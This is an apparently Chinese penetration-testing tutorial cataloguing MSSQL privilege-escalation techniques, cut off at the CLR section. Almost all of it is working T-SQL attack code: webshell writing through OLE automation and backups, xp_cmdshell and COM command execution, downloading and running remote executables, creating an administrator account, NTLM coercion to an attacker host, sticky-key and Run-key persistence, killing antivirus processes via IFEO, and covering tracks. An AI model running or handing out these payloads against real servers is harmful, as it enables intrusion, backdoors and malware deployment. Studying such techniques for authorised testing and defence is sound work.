

# mssql 提权 (总结篇)

最近一段时间学习了 MSSQL 数据库提权相关的知识，总结了一些常见手段，应该是比较全的了，如有遗漏还请指正。

info

本文首发 跳跳糖社区 [https://tttang.com/archive/1545/](https://tttang.com/archive/1545/)

- - -

# [](#%E5%B8%B8%E8%A7%81%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B)常见存储过程

首先先看几个常见的存储过程

**xp\_dirtree**

xp\_dirtree 用于显示当前目录的子目录，该存储过程有三个参数：

-   directory：第一个参数是要查询的目录；
-   depth：第二个参数是要显示的子目录的深度，默认值是 0，表示显示所有的子目录；
-   file：第三个参数是 bool 类型，指定是否显示子目录中的文件（file），默认值是 0，表示不显示任何文件，只显示子目录（directory）；

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```sql<br>-- 只列 c:\ 文件夹<br>exec xp_dirtree 'c:',1<br>-- 列 c:\ 文件夹加文件<br>exec xp_dirtree 'c:',1,1<br>-- 列出所有 c:\ 文件和目录,子目录,内容会很多,慎用<br>exec xp_dirtree 'c:'<br>``` |

[![](assets/1710207526-fc59778f59c722606a22f367d2dab6e3.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/1.png)

[![](assets/1710207526-d39c0ea1bb64c0022a7cd5447ea4e610.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/2.png)

[![](assets/1710207526-e6d6430df4dc58a5824758485e960b6a.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/3.png)

xp\_dirtree 还可以用来触发 NTLM 请求

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>xp_dirtree '\\<attacker_IP>\any\thing'<br>exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'<br>``` |

**xp\_subdirs**

xp\_subdirs 用于得到给定的文件夹内的文件夹列表

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 列出 C:\\ 目录<br>exec xp_subdirs "C:\\"<br>``` |

[![](assets/1710207526-323e81603f79adf7eb10d8d2e3f95c35.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/4.png)

**xp\_fixeddrives**

xp\_fixeddrives 用于查看磁盘驱动器剩余（free）的空间

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 查看磁盘驱动的空闲空间<br>EXEC xp_fixeddrives<br>``` |

[![](assets/1710207526-5a414460a47bd0ece9985bc5d04cc989.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/5.png)

**xp\_availablemedia**

xp\_availablemedia 用于获得当前所有驱动器

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 列出磁盘<br>EXEC xp_availablemedia<br>``` |

[![](assets/1710207526-679b89ae2a5a1b2bd8cef60d110beba3.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/6.png)

**xp\_fileexist**

用于判断文件是否存在的存储过程，参数是文件（file）的路径或目录的路径

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 判断文件 D:\test.txt 是否存在<br>exec master.sys.xp_fileexist 'D:\test.txt'<br>``` |

**xp\_create\_subdir**

用于创建子目录的存储过程，参数是子目录的路径

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 创建子目录 D:\test<br>exec master.sys.xp_create_subdir 'D:\test'<br>``` |

**xp\_delete\_file**

可用于删除文件的存储过程，但该存储过程不会删除任意类型的文件，系统限制它只能删除特定类型（备份文件和报表文件）的文件。

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```sql<br>-- 删除文件<br>declare @Date datetime = dateadd(day,-30,getdate())<br>exec master.sys.xp_delete_file 0,'D:\test\','bak',@Date,0<br><br>-- 第一个参数是文件类型（File Type），有效值是0和1，0是指备份文件，1是指报表文件；<br>-- 第二个参数是目录路径（Folder Path）， 目录中的文件会被删除，目录路径必须以“\”结尾；<br>-- 第三个参数是文件的扩展名（File Extension），常用的扩展名是'BAK' 或'TRN'；<br>-- 第四个参数是Date，早于该日期创建的文件将会被删除；<br>-- 第五个参数是子目录（Subfolder），bool类型，0是指忽略子目录，1是指将会删除子目录中的文件；<br>``` |

**xp\_regenumkeys**

xp\_regenumkeys 可以查看指定的注册表

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 枚举可用的注册表键值<br>exec xp_regenumkeys 'HKEY_CURRENT_USER','Control Panel\International'<br>``` |

[![](assets/1710207526-2484b1d62272731cdd01a214924c5ae7.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/7.png)

**xp\_regdeletekey**

xp\_regdeletekey 可以删除指定的注册表值

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 删除指定的注册表值<br>EXEC xp_regdeletekey 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe';<br>``` |

# [](#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell)存储过程写 webshell

利用条件

-   拥有 DBA 权限
-   知道的网站绝对路径

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```sql<br>-- 首先判断当前是否为DBA权限，为1则可以提权<br>select is_srvrolemember('sysadmin');<br><br>-- 利用存储过程写入一句话,注意路径<br>declare @o int, @f int, @t int, @ret int<br>exec sp_oacreate 'scripting.filesystemobject', @o out<br>exec sp_oamethod @o, 'createtextfile', @f out, 'C:\www\test.asp', 1<br>exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("a"))%>'<br>``` |

[![](assets/1710207526-c32a3cfd159a3643b11f32f02e96d898.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/8.png)

[![](assets/1710207526-24ec4ebb645bfec581126e43d02577ba.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/9.png)

# [](#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E5%86%99webshell)差异备份写 webshell

**描述**

在 sql server 里 dbo 和 sa 权限都有备份数据库权限，我们可以把数据库备份成 asp 文件，获得 webshell

利用条件

-   需要知道绝对路径，路径可写

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>``` | ```sql<br>-- 生成备份文件,注意库名和路径<br>backup database test to disk = 'c:\www\bak.bak';<br><br>-- 创建表：<br>create table [dbo].[test] ([cmd] [image]);<br><br>-- 插入一句话：<%execute(request("a"))%><br>insert into test(cmd)  values(0x3C25657865637574652872657175657374282261222929253E)<br><br>-- 再次备份,注意路径<br>backup database test to disk='C:\www\shell.asp' WITH DIFFERENTIAL,FORMAT;<br>``` |

因为权限的问题，最好不要备份到盘符根目录，如果这种方式失败，大概率是备份的目录没有写权限

当过滤了特殊的字符比如单引号，或者 路径符号 都可以使用定义局部变量来执行。

# [](#%E6%97%A5%E5%BF%97%E5%A4%87%E4%BB%BD%E5%86%99webshell)日志备份写 webshell

优势：

-   重复性好，多次备份的成功率高
-   相对于差异备份而言，shell 的体积较小

利用条件：

-   拥有 DBA 权限
-   知道网站绝对路径，并且可写
-   站库不分离
-   数据库必须被备份过一次

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```sql<br>-- 判断当前是否为DBA权限，为1则可以提权<br>select is_srvrolemember('sysadmin');<br><br>-- 利用存储过程写入一句话,注意库名和路径<br>alter database 库名 set RECOVERY FULL<br>create table cmd (a image)<br>backup log 库名 to disk = 'c:\www' with init<br>insert into cmd (a) values (0x3C25657865637574652872657175657374282261222929253E)<br>backup log 库名 to disk = 'c:\www\2.asp'<br>``` |

# [](#sp_addextendedproc)sp\_addextendedproc

sp\_addextendedproc 可以利用于恢复组件

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>``` | ```sql<br>EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'<br>EXEC sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'<br>EXEC sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'<br>EXEC sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'<br>EXEC sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'<br>EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'<br>``` |

# [](#xp_cmdshell)xp\_cmdshell

**描述**

xp\_cmdshell 是 Sql Server 中的一个组件，我们可以用它来执行系统命令。

利用条件

-   拥有 DBA 权限，在 2005 中 xp\_cmdshell 的权限是 system，2008 中是 network。
-   依赖 xplog70.dll

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>``` | ```sql<br>-- 判断当前是否为DBA权限，为1则可以提权<br>select is_srvrolemember('sysadmin');<br><br>-- 查看是否存在 xp_cmdshell<br>EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br><br>-- 查看能否使用 xp_cmdshell，从MSSQL2005版本之后默认关闭<br>select count(*) from master.dbo.sysobjects where xtype = 'x' and name = 'xp_cmdshell'<br><br>-- 关闭 xp_cmdshell<br>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;<br><br>-- 开启 xp_cmdshell<br>EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;<br><br>-- 执行 xp_cmdshell<br>exec master..xp_cmdshell 'cmd /c whoami'<br><br>-- xp_cmdshell 调用cmd.exe用powershell 远程下载exe并执行<br>exec master..xp_cmdshell '"echo $client = New-Object System.Net.WebClient > %TEMP%\test.ps1 & echo $client.DownloadFile("http://example/test0.exe","%TEMP%\test.exe") >> %TEMP%\test.ps1 & powershell  -ExecutionPolicy Bypass  %temp%\test.ps1 & WMIC process call create "%TEMP%\test.exe""'<br>``` |

[![](assets/1710207526-3dbc4eb0efe97f44b3fa488edd924a81.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/26.png)

**无会显，也无法进行 dnslog 怎么办**

通过临时表查看命令执行的结果

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>``` | ```sql<br>CREATE TABLE tmpTable (tmp1 varchar(8000));<br>insert into tmpTable(tmp1) exec master..xp_cmdshell 'ipconfig'<br>select * from tmpTable<br>``` |

[![](assets/1710207526-dd566a0bd8b63688e8e3e81f1785d10a.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/27.png)

**常见报错**

-   标记 message: 配置选项‘xp\_cmdshell’不存在，也可能是高级选
    
    |     |     |     |
    | --- | --- | --- |
    | ```bash<br>1<br>``` | ```sql<br>EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'user connections',1;RECONFIGURE;<br>``` |
    

**痕迹清理**

删除扩展存储过过程 xp\_cmdshell

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>``` | ```sql<br>exec sp_dropextendedproc 'xp_cmdshell'<br>``` |

**如果 xp\_cmdshell 被删除了怎么办**

如果 xp\_cmdshell 被删除了，需要重新恢复或自己上传 xplog70.dll 进行恢复

以 mssql2012 为例，默认路径为

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>``` | ```fallback<br>C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\Binn\xplog70.dll<br>``` |

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```sql<br>-- 判断存储扩展是否存在,返回结果为1就OK<br>Select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'<br><br>-- 恢复xp_cmdshell,返回结果为1就OK<br>Exec sp_addextendedproc 'xp_cmdshell','xplog70.dll';<br>select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'<br><br>-- 否则上传xplog70.dll<br>Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\xplog70.dll'<br>``` |

**bypass**

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>``` | ```fallback<br>‘; DECLARE @x AS VARCHAR(100)=’xp_cmdshell’; EXEC @x ‘ping xxx.burpcollaborator.net’ —<br>``` |

# [](#sp_oacreate-ole-automation-procedures)sp\_oacreate (Ole Automation Procedures)

利用条件

-   拥有 DBA 权限
-   依赖 odsole70.dll

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>``` | ```sql<br>-- 判断当前是否为DBA权限，为1则可以提权<br>select is_srvrolemember('sysadmin');<br><br>-- 判断SP_OACREATE状态,如果存在返回1<br>select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'<br><br>-- 启用 sp_oacreate<br>exec sp_configure 'show advanced options',1;RECONFIGURE;<br>exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;<br><br>-- 关闭 sp_oacreate<br>exec sp_configure 'ole automation procedures',0;reconfigure;<br>exec sp_configure 'show advanced options',0;reconfigure;<br>``` |

**wscript.shell 组件执行命令**

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```sql<br>declare @ffffffff0x int,@exec int,@text int,@str varchar(8000)<br>exec sp_oacreate 'wscript.shell',@ffffffff0x output<br>exec sp_oamethod @ffffffff0x,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'<br>exec sp_oamethod @exec, 'StdOut', @text out<br>exec sp_oamethod @text, 'readall', @str out<br>select @str;<br>``` |

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>``` | ```sql<br>declare @ffffffff0x int<br>exec sp_oacreate 'wscript.shell',@ffffffff0x output<br>exec sp_oamethod @ffffffff0x,'run',null,'c:\windows\system32\cmd.exe /c whoami >c:\\www\\1.txt'<br>``` |

[![](assets/1710207526-33108c321d1b2678b7875ac5d771823f.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/10.png)

**利用 com 组件执行命令**

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```sql<br>declare @ffffffff0x int,@exec int,@text int,@str varchar(8000)<br>exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@ffffffff0x output<br>exec sp_oamethod @ffffffff0x,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c whoami'<br>exec sp_oamethod @exec, 'StdOut', @text out<br>exec sp_oamethod @text, 'readall', @str out<br>select @str;<br>``` |

[![](assets/1710207526-6125ba8a3ed59ff2e633bf68635d6d56.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/11.png)

**利用 com 组件写文件**

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```sql<br>DECLARE @ObjectToken INT;<br>EXEC Sp_OACreate '{00000566-0000-0010-8000-00AA006D2EA4}',@ObjectToken OUTPUT;<br>EXEC Sp_OASetProperty @ObjectToken, 'Type', 1;<br>EXEC sp_oamethod @ObjectToken, 'Open';<br>EXEC sp_oamethod @ObjectToken, 'Write', NULL, 0x66666666666666663078;<br>EXEC sp_oamethod @ObjectToken, 'SaveToFile', NULL,'ffffffff0x.txt',2;<br>EXEC sp_oamethod @ObjectToken, 'Close';<br>EXEC sp_OADestroy @ObjectToken;<br>``` |

[![](assets/1710207526-5ef3661e95cfabc080c7c2153a4d30d9.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/12.png)

**filesystemobject COM 对象利用**

-   [https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object](https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/filesystemobject-object)

filesystemobject”COM 对象允许我们复制文件、管理驱动器等等。

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```sql<br>-- 利用 filesystemobject 写vbs脚本<br>declare @o int, @f int, @t int, @ret int,@a int<br>exec sp_oacreate 'scripting.filesystemobject', @o out<br>exec sp_oamethod @o,'createtextfile', @f out, 'c:\\www\\ffffffff0x.vbs', 1<br>exec @ret = sp_oamethod @f, 'writeline', NULL, 'hahahahahahhahahah'<br><br>-- 配合 wscript.shell 组件执行<br>DECLARE @s int EXEC sp_oacreate [wscript.shell], @s out<br>EXEC sp_oamethod @s,[run],NULL,[c:\\www\\ffffffff0x.vbs]<br>``` |

[![](assets/1710207526-015c775e83d869f021455a94f792d87e.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/13.png)

[![](assets/1710207526-af144899eea6c93eaf1c30a6a96a798e.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/14.png)

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>``` | ```sql<br>-- 复制具有不同名称和位置的 calc.exe 可执行文件<br>declare @ffffffff0x int;<br>exec sp_oacreate 'scripting.filesystemobject', @ffffffff0x out;<br>exec sp_oamethod @ffffffff0x,'copyfile',null,'c:\\windows\\system32\calc.exe','c:\\windows\\system32\calc_copy.exe';<br>``` |

[![](assets/1710207526-f46ff7428e0626beb524c7f5ae6a65b7.webp)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/15.webp)

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>``` | ```sql<br>-- 移动文件<br>declare @ffffffff0x int<br>exec sp_oacreate 'scripting.filesystemobject',@ffffffff0x out<br>exec sp_oamethod @ffffffff0x,'movefile',null,'c:\\www\\1.txt','c:\\www\\3.txt'<br>``` |

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```sql<br>-- 删除文件<br>declare @result int<br>declare @ffffffff0x int<br>exec sp_oacreate 'scripting.filesystemobject', @ffffffff0x out<br>exec sp_oamethod @ffffffff0x,'deletefile',null,'c:\\www\\1.txt'<br>exec sp_oadestroy @ffffffff0x<br>``` |

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>``` | ```sql<br>-- 替换粘滞键<br>declare @ffffffff0x int;<br>exec sp_oacreate 'scripting.filesystemobject', @ffffffff0x out;<br>exec sp_oamethod @ffffffff0x,'copyfile',null,'c:\\windows\\system32\calc.exe','c:\\windows\\system32\sethc.exe';<br><br>declare @ffffffff0x int;<br>exec sp_oacreate 'scripting.filesystemobject', @ffffffff0x out;<br>exec sp_oamethod @ffffffff0x,'copyfile',null,'c:\windows\system32\sethc.exe','c:\windows\system32\dllcache\sethc.exe'<br>``` |

**ScriptControl COM 对象利用 (未测试成功)**

-   [https://developpaper.com/introduction-of-msscriptcontrol-scriptcontrol-component-properties-methods-and-events/](https://developpaper.com/introduction-of-msscriptcontrol-scriptcontrol-component-properties-methods-and-events/)

ScriptControl 允许我们在 SQL Server 中实际运行脚本语言，例如 VBScript 或 JavaScript。

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>``` | ```sql<br>-- 使用 JavaScript 创建帐户、更改其密码并将新帐户添加到管理员组<br>declare @ffffffff0x int<br>EXEC sp_OACreate 'ScriptControl',@ffffffff0x OUT;<br>EXEC sp_OASetProperty @ffffffff0x, 'Language', 'JavaScript';<br>EXEC sp_OAMethod @ffffffff0x, 'Eval', NULL,<br>    'var o=new ActiveXObject("Shell.Users");<br>    z=o.create("testuser");<br>    z.changePassword("123456!@#","")<br>    z.setting("AccountType")=3;';<br><br>-- 0:"Guests"<br>-- 1:"Users"<br>-- 2:"Power Users"<br>-- 3:"Administrators"<br><br>-- 下载恶意软件<br>declare @ffffffff0x int<br>EXEC sp_OAcreate 'Scriptcontrol',@ffffffff0x OUT;<br>EXEC sp_OASetProperty @ffffffff0x, 'Language', 'JavaScript';<br>EXEC sp_OAMethod @ffffffff0x, 'Eval', NULL,<br>    'var x = new ActiveXObject("Microsoft.XMLHTTP");<br>    x.Open("GET","http://x.x.x.x:443/test.exe",0);<br>    x.Send();<br>    var s = new ActiveXObject("ADODB.Stream");<br>    s.Mode = 3;<br>    s.Type = 1;<br>    s.Open();<br>    S.Write(x.responseBody);<br>    s.SaveToFile("C:\\www\\test.exe",2);<br>    var r = new ActiveXObject("WScript.Shell");<br>    r.Run("C:\\www\\test.exe");';<br>``` |

**WMI COM 对象利用**

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```sql<br>declare @objWmi int,@objLocator int,@objPermiss int,@objRet int,@objFull varchar(8000)<br>EXEC sp_OACreate 'WbemScripting.SWbemLocator.1',@objLocator OUTPUT;<br>EXEC sp_OAMethod @objLocator,'ConnectServer',@objWmi OUTPUT,'.','root\cimv2';<br>EXEC sp_OAMethod @objWmi,'Get',@objPermiss OUTPUT,'Win32_LogicalFileSecuritySetting.Path=''wscript.exe''';<br>EXEC sp_OAMethod @objWmi,'Get',@objFull OUTPUT, 'Win32_SecurityDescriptor';<br>EXEC sp_OASetProperty @objFull,'ControlFlags',4;<br>EXEC sp_OAMethod @objPermiss,'SetSecurityDescriptor',@objRet output,@objFull;<br>``` |

# [](#xp_regwrite)xp\_regwrite

利用条件

-   xpstar.dll

**修改注册表来劫持粘贴键 (映像劫持)**

利用 regwrite 函数修改注册表，起到劫持作用

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>3<br>4<br>``` | ```sql<br>exec master..xp_regwrite @rootkey='HKEY_LOCAL_MACHINE',@key='SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE',@value_name='Debugger',@type='REG_SZ',@value='c:\windows\system32\cmd.exe'<br><br>-- 检查是否劫持成功<br>exec master..xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe','Debugger'<br>``` |

[![](assets/1710207526-8435dfa53b620e4cc5100a286ef108d5.png)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/16.png)

**将 COM 对象注册到 CLSID**

在进行 sp\_oacreate 利用的时候就有使用 com 组件执行命令的方法

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>13<br>14<br>15<br>``` | ```sql<br>-- 使用其 CLSID '0D43FE01-F093-11CF-8940-00A0C9054228' 注册 'The File System Object component'<br>EXEC xp_regwrite N'HKEY_ CLASSES_ROOT',<br>N'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\', N'', REG_SZ, N'FileSystem Object';<br>EXEC xp_regwrite N'HKEY_CLASSES_ROOT',<br>N'CLSID\(0D43FE01-F093-11CF-8940-00A0C9054228}\InProcServer32', N'',<br>REG_SZ, N'%systemroot%\system32\scrrun.dll';<br>EXEC xp_regwrite N'HKEY_CLASSES_ROOT',<br>N'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\ProgID',N'',REG_SZ,<br>N'Scripting.FileSystemObject';<br>EXEC xp_regwrite N'HKEY_CLASSES_ROOT',<br>N'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\TypeLib',N'',REG_SZ,<br>N'{420B2830-E718-11CF-893D-00A0C9054228}';<br>EXEC xp_regwrite N'HKEY_CLASSES_ROOT',<br>N'CLSID\{0D43FE01-F093-11CF-8940-00A0C9054228}\Version',N'',REG_SZ,<br>N'1.0';<br>``` |

**CMD AutoRun**

当 CMD.exe（命令处理器）启动时，如果未指定 /D 标志，将执行 AutoRun 命令。

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 将 CMD.exe 的 AutoRun 注册表项与软件可执行路径 (c:\windows\system32\calc.exe) 添加,作为持久化的后门<br>EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Command Processor','Autorun','REG_SZ','c:\windows\system32\calc.exe'<br>``` |

[![](assets/1710207526-ec1f19ae775ec2816f3222f79127e3ad.webp)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/17.webp)

[![](assets/1710207526-08bfc26a884c6197cb090d1cd6a77344.webp)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/18.webp)

**Run & RunOnce**

Run 和 RunOnce 注册表项会导致程序在用户每次登录时运行。

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 通过将带有可执行路径 (c:\windows\system32\calc.exe) 的 Aut3 条目添加到此注册表路径，攻击者确保每次用户登录服务器时都会执行恶意软件。<br>EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows\CurrentVersion\Run','Aut3','REG_SZ','c:\windows\system32\calc.exe'<br>``` |

[![](assets/1710207526-9791d93b4def46e2ad1d21c48f6986cf.webp)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/19.webp)

注销，重新登录，触发 calc

[![](assets/1710207526-f7ab542f5b6ab23775529ee2c7e23acd.webp)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/20.webp)

**禁用指定软件**

攻击者需要确保在部署加密矿工时杀死反病毒进程以保持不被发现。所以可以设置在某些应用启动时自动关闭。

|     |     |     |
| --- | --- | --- |
| ```bash<br>1<br>2<br>``` | ```sql<br>-- 禁用正在运行的进程的方法是使用 IFEO（Image File Execution Options），通过添加值为 taskkill 的调试器键，在这种情况下将杀死特定进程 Everything.exe：<br>EXEC master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Everything.exe','Debugger','REG_SZ','taskkill.exe'<br>``` |

[![](assets/1710207526-c8b6afe668faaf66c5e6cf7393c63e46.webp)](https://r0fus0d.blog.ffffffff0x.com/img/mssql-pentest/21.webp)

此时只要开启 Everything 就会自动关闭。

# [](#sql-server-agent-job-%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%88%A9%E7%94%A8)SQL Server Agent Job 代理执行计划任务利用

**描述**

SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业。

利用条件

-   拥有 DBA 权限
-   需要 sqlserver 代理 (sqlagent) 开启，Express 版本 Sql Server 是无法启用的

|     |     |     |
| --- | --- | --- |
| ```bash<br> 1<br> 2<br> 3<br> 4<br> 5<br> 6<br> 7<br> 8<br> 9<br>10<br>11<br>12<br>``` | ```sql<br>-- 开启 sqlagent 服务<br>exec master.dbo.xp_servicecontrol 'start','SQLSERVERAGENT';<br><br>-- 利用任务计划命令执行（无回显,可以 dnslog）<br>-- 创建任务 test，这里test为任务名称，并执行命令，命令执行后的结果，将返回给文本文档out.txt<br><br>use msdb;<br>exec sp_delete_job null,'test'<br>exec sp_add_job 'test'<br>exec sp_add_jobstep null,'test',null,'1','cmdexec','cmd /c "whoami>c:/out.txt"'<br>exec sp_add_jobserver null,'test',@@servername<br>exec sp_start_job 'test';<br>``` |

# [](#clr%E6%8F%90%E6%9D%83)CLR 提权

**描述**

